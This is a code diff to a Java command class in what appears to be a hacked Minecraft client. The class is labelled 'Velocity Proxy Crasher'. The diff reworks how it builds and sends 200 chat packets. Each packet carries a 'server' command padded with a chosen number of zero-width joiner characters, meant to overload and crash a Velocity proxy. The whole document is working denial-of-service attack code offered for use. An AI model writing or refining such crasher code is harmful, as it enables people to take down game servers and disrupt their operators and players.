@@ -7,9 +7,10 @@ import com.mojang.brigadier.builder.RequiredArgumentBuilder;
 import com.mojang.brigadier.context.CommandContext;
 import net.paradise_client.command.Command;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
+import net.minecraft.network.PacketByteBuf;
 import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
 import net.minecraft.command.CommandSource;
-import net.minecraft.text.Text;
+import io.netty.buffer.Unpooled;
 
 /**
  * Command: Velocity Proxy Crasher
@@ -54,10 +55,12 @@ public class VelocityCrasherCommand extends Command {
             int power = ctx.getArgument("power", Integer.class);
 
             String filler = "\u200d"; // Zero-width joiner
-            Text message = Text.literal("server " + server + " " + filler.repeat(power));
+            String message = "server " + server + " " + filler.repeat(power);
 
             for (int i = 0; i < 200; i++) {
-                net.sendPacket(new ChatMessageC2SPacket(message));
+                PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
+                buf.writeString(message);
+                net.sendPacket(new ChatMessageC2SPacket(buf));
             }
 
             try {
